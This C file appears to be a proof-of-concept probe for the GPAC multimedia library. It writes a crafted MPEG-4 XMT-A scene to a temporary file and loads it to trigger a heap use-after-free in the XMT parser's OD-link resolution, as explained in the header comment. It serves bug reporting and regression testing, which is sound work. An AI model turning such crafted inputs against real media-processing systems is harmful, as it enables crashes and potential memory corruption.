/*
 * GPAC scene-manager OD-link lifetime probe.
 *
 * Loads an XMT-A scene through the public scene loader API
 * (gf_sm_load_init/gf_sm_load_run/gf_sm_load_done). The document is a
 * regular MPEG-4 XMT-A scene: an ObjectDescriptor update declaring OD 5,
 * a MovieTexture referencing it through url="od:5" inside a DEF'd
 * Appearance that is later detached (replaced in the appearance field),
 * and a PROTO declaration whose command buffer holds a scene replace.
 *
 * On a tree where the loader keeps the assigned OD link alive across the
 * PROTO unwind while scoping the deferred DEF-node link sweep to proto
 * instance sub-graphs, the deferred DEF release frees the Appearance
 * (and the MovieTexture holding the linked MFURL) and the end-of-parse
 * OD link resolution dereferences the freed MFURL: AddressSanitizer
 * aborts with a heap-use-after-free in xmt_resolve_od_links.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <gpac/tools.h>
#include <gpac/scenegraph.h>
#include <gpac/scene_manager.h>

static const char *poc_xmt =
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
"<XMT-A xmlns=\"urn:mpeg:mpeg4:xmta:schema:2002\"\n"
" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n"
" xsi:schemaLocation=\"urn:mpeg:mpeg4:xmta:schema:2002 xmt-a.xsd\">\n"
" <Header>\n"
" </Header>\n"
" <Body>\n"
"  <OD>\n"
"   <ObjectDescriptorUpdate>\n"
"    <ObjectDescriptor objectDescriptorID=\"od5\" binaryID=\"5\"/>\n"
"   </ObjectDescriptorUpdate>\n"
"  </OD>\n"
"  <Replace>\n"
"   <Scene>\n"
"    <OrderedGroup>\n"
"     <children>\n"
"      <Shape>\n"
"       <appearance>\n"
"        <Appearance DEF=\"D\">\n"
"         <texture><MovieTexture url=\"od:5\"/></texture>\n"
"        </Appearance>\n"
"       </appearance>\n"
"       <appearance>\n"
"        <Appearance/>\n"
"       </appearance>\n"
"       <geometry><Rectangle size=\"100 100\"/></geometry>\n"
"      </Shape>\n"
"     </children>\n"
"    </OrderedGroup>\n"
"    <ProtoDeclare name=\"P\">\n"
"     <ProtoBody>\n"
"      <Conditional>\n"
"       <buffer>\n"
"        <Replace>\n"
"         <Scene>\n"
"          <Transform/>\n"
"         </Scene>\n"
"        </Replace>\n"
"       </buffer>\n"
"      </Conditional>\n"
"     </ProtoBody>\n"
"    </ProtoDeclare>\n"
"   </Scene>\n"
"  </Replace>\n"
" </Body>\n"
"</XMT-A>\n";

int main(void)
{
	GF_Err e;
	GF_SceneGraph *sg;
	GF_SceneManager *sm;
	GF_SceneLoader load;
	char path[512];
	FILE *f;

	gf_sys_init(GF_MemTrackerNone, NULL);
	gf_log_set_tool_level(GF_LOG_ALL, GF_LOG_WARNING);

	snprintf(path, sizeof(path), "/tmp/gpac_od_probe_%d.xmt", (int)getpid());
	f = fopen(path, "wb");
	if (!f) {
		fprintf(stderr, "cannot write %s\n", path);
		return 2;
	}
	fwrite(poc_xmt, 1, strlen(poc_xmt), f);
	fclose(f);

	sg = gf_sg_new();
	sm = gf_sm_new(sg);
	memset(&load, 0, sizeof(load));
	load.fileName = path;
	load.ctx = sm;

	e = gf_sm_load_init(&load);
	if (!e) {
		e = gf_sm_load_run(&load);
		gf_sm_load_done(&load);
	}
	printf("scene load result: %d (%s)\n", e, gf_error_to_string(e));

	gf_sm_del(sm);
	gf_sg_del(sg);
	gf_sys_close();
	unlink(path);
	return 0;
}
